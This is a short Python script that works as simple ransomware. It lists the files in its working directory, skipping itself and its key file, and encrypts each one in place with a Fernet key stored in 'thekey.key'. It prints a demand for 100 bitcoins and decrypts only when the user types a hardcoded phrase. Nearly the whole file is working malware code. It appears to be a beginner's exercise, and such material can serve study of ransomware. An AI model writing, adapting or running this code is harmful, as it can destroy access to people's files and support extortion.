import os
from cryptography.fernet import Fernet
files = []

for file in os.listdir():
    if file == 'test.py' or file == "thekey.key":
        continue
    if os.path.isfile(file):
        files.append(file)



print('Your files have been encrypted send me 100 bitcoins and I will decrypt them')
# print(files)

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)







secretphrase = "sorry!"   #   <== password
phrase = input('Enter the secret phrase to decrypt your files: ')
if phrase == secretphrase:


    with open("thekey.key", "wb") as thekey:
        thekey.write(key)

    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(key).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)

